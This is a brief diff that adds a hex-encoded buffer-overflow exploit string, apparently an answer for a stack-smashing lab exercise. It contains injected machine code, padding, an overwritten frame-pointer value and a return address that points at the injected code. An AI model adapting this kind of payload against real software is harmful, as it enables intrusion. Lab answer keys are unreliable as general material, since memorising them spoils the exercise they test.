@@ -1,0 +1,3 @@
+b8 ce 50 3a 3d c7 05 34 35 68 55 be 8d 04 08 bc 34 35 68 55 c3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 
+/* ebp value do not change */ 60 35 68 55 
+/* address of the exploit code */ 08 35 68 55
